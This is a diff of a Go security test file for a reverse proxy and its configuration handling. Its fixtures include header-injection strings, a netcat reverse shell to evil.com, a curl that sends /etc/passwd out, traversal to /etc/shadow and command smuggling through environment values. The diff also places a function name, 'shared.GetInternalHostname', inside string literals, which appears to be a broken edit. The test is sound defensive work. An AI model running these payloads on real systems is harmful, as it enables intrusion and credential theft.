@@ -129,7 +129,7 @@ func TestReverseProxySecurity(t *testing.T) {
 	t.Run("header_injection_security", func(t *testing.T) {
 		// Test header injection security
 		maliciousHeaders := map[string]string{
-			"X-Forwarded-For": "127.0.0.1\r\nX-Admin: true",
+			"X-Forwarded-For": "shared.GetInternalHostname\r\nX-Admin: true",
 			"X-Real-IP":       "192.168.1.1\r\n\r\nGET /admin HTTP/1.1",
 			"Host":            "example.com\r\nConnection: close",
 			"X-Custom":        "value\nSet-Cookie: admin=true",
@@ -352,7 +352,7 @@ func TestConfigurationInjectionSecurity(t *testing.T) {
 		// Test environment variable injection
 		maliciousEnvVars := map[string]string{
 			"DOMAIN":        "example.com; export ADMIN=true",
-			"BACKEND_IP":    "127.0.0.1 && nc -e /bin/sh evil.com 4444",
+			"BACKEND_IP":    "shared.GetInternalHostname && nc -e /bin/sh evil.com 4444",
 			"PORT":          "8080 || curl http://evil.com?data=$(cat /etc/passwd)",
 			"SSL_CERT_PATH": "/etc/ssl/certs/../../etc/shadow",
 			"LOG_LEVEL":     "debug; cat /etc/passwd > /tmp/leaked",
